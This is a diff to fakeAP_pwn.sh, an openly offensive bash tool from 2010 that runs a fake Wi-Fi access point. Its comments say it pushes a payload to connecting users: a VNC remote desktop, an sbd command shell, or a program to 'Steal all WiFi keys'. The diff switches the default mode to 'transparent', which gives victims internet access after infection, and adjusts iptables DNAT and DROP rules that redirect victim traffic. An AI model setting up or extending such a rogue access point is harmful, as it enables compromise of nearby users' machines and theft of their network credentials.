@@ -1,6 +1,6 @@
 #!/bin/bash                                                                                    #
 # (C)opyright 2010 - g0tmi1k & joker5bb                                                        #
-# fakeAP_pwn.sh v0.3 (Beta-#83 2010-08-06)                                                     #
+# fakeAP_pwn.sh v0.3 (Beta-#85 2010-08-08)                                                     #
 #---Important----------------------------------------------------------------------------------#
 # Make sure to copy "www": cp -rf www/* /var/www/fakeAP_pwn                                    #
 # The VNC password is "g0tmi1k" (without "")                                                   #
@@ -39,7 +39,7 @@ fakeAPchannel=1
 apType=airbase-ng
 
 # [normal/transparent/non] - Normal = Doesn't force them, just sniff. Transparent = after been infected gives them internet. non = No internet access afterwards
-apMode=normal
+apMode=transparent
 
 # [sbd/vnc/wkv/other] What to upload to the user. vnc=remote desktop, sbd=cmd line, wkv=Steal all WiFi keys
 payload=wkv
@@ -70,7 +70,7 @@ verbose=0
 gatewayIP=$(route -n | awk '/^0.0.0.0/ {getline; print $2}')
     ourIP="127.0.0.1"                # 10.0.0.1?
      port=$(shuf -i 2000-65000 -n 1) # Random port each time
-  version="0.3 (Beta-#83)"
+  version="0.3 (Beta-#85)"
       www="${www%/}"                 # Remove trailing slash
 trap 'cleanup interrupt' 2           # Interrupt - "Ctrl + C"
 
@@ -1282,7 +1282,7 @@ if [ "$apMode" == "normal" ] ; then
    iptables --table nat --append PREROUTING --jump DNAT --to-destination $gatewayIP
    #iptables --table nat --append PREROUTING --proto udp --destination-port 53 --jump DNAT --to-destination $gatewayIP #only DNS
    #iptables --table nat --append PREROUTING --proto tcp --destination-port 53 --jump DNAT --to-destination $gatewayIP #tcp and udp can be used to transfer dns
-   iptables -A INPUT -m iprange --src-range 10.0.0.150-10.0.0.250 --in-interface $apInterface --to-destination $gatewayIP -j DROP # protect our internet gateway
+   iptables -A INPUT -m iprange --src-range 10.0.0.150-10.0.0.250 --in-interface $apInterface --destination $gatewayIP -j DROP # protect our internet gateway
 elif [ "$apMode" == "non" ] || [ "$apMode" == "transparent" ] ; then
    #iptables -A INPUT -p udp -i $apInterface --dport 53 -j ACCEPT
    #iptables -A INPUT -p tcp -i $apInterface --dport 53 -j ACCEPT
@@ -1419,7 +1419,7 @@ fi
       iptables --table nat --append PREROUTING --jump DNAT --to-destination $gatewayIP
       #iptables --table nat --append PREROUTING --proto udp --destination-port 53 --jump DNAT --to-destination $gatewayIP
       #iptables --table nat --append PREROUTING --proto tcp --destination-port 53 --jump DNAT --to-destination $gatewayIP
-      iptables --append INPUT -m iprange --src-range 10.0.0.150-10.0.0.250 --in-interface $apInterface --to-destination $gatewayIP --proto all -j DROP  # Protect the gateway
+      iptables --append INPUT -m iprange --src-range 10.0.0.150-10.0.0.250 --in-interface $apInterface --destination $gatewayIP -j DROP  # Protect the gateway
    fi
 
 #----------------------------------------------------------------------------------------------#
